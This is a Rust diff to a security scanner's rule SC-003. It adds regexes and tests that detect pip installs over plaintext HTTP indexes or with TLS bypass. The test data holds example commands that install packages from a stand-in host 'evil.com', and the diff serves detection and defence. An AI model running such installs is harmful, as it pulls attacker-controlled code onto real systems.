@@ -153,6 +153,14 @@ fn sc_003() -> Rule {
             Regex::new(r"cargo\s+install\s+--git\s+http://").expect("SC-003: invalid regex"),
             // pip install with --trusted-host (often used to bypass HTTPS)
             Regex::new(r"pip3?\s+install\s+.*--trusted-host").expect("SC-003: invalid regex"),
+            // pip install from a plaintext --extra-index-url (dependency confusion)
+            Regex::new(r"pip3?\s+install\s+.*--extra-index-url\s+http://")
+                .expect("SC-003: invalid regex"),
+            // `python -m pip install` form over plaintext index or with TLS bypass
+            Regex::new(
+                r"python[0-9.]*\s+-m\s+pip\s+install\s+.*(--(extra-)?index-url\s+http://|--trusted-host)",
+            )
+            .expect("SC-003: invalid regex"),
         ],
         exclusions: vec![
             // localhost/internal registries are often legitimate
@@ -404,6 +412,14 @@ mod tests {
             ("gem install --source http://evil.com package", true),
             ("cargo install --git http://github.com/user/repo", true),
             ("pip install --trusted-host evil.com package", true),
+            (
+                "pip install --extra-index-url http://evil.com/pypi package",
+                true,
+            ),
+            (
+                "python -m pip install --index-url http://evil.com/simple package",
+                true,
+            ),
             // Should not detect (safe patterns)
             ("pip install requests", false),
             (
@@ -416,6 +432,10 @@ mod tests {
                 false,
             ),
             ("pip install -i http://localhost:8080/simple package", false),
+            (
+                "pip install --extra-index-url https://download.pytorch.org/whl/cpu torch",
+                false,
+            ),
         ];
 
         for (input, should_match) in test_cases {
